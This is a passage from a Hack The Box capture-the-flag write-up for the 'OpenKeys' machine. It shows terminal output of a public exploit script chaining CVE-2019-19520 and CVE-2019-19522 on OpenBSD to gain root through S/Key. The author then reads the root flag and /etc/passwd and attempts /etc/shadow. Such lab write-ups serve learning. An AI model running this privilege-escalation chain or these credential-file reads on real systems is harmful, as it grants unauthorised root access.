> Password sequence numbers count backwards. You can enter the passwords using small letters, even though skey prints them capitalized.

After verifying the type of authentication, then deleting and recreating the skey auth key, the exploit `su`'s to UID 0 (root) using skey as the authentication method.  

### Root.txt

```
openkeys$ nano .exploit.sh
openkeys$ chmod +x .exploit.sh                                                                        
openkeys$ ./.exploit.sh                                                                               
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# id && hostname                                                                        
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys.htb

openkeys# cat /root/root.txt
f3a553b1697050ae885e7c02dbfc6efa

openkeys# cat /etc/shadow
cat: /etc/shadow: No such file or directory

openkeys# cat /etc/passwd
root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
operator:*:2:5:System &:/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
_identd:*:29:29:identd:/var/empty:/sbin/nologin
_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
_x11:*:35:35:X Server:/var/empty:/sbin/nologin
_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
_rebound:*:52:52:Rebound DNS Daemon:/var/empty:/sbin/nologin
_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
www:*:67:67:HTTP Server,,,:/var/www:/sbin/nologin
_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
_file:*:104:104:file privsep:/var/empty:/sbin/nologin
_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
_gitdaemon:*:778:778:GIT Daemon:/nonexistent:/sbin/nologin
jennifer:*:1001:1001:Jennifer Miller,,,:/home/jennifer:/bin/ksh
```

Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033)for something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
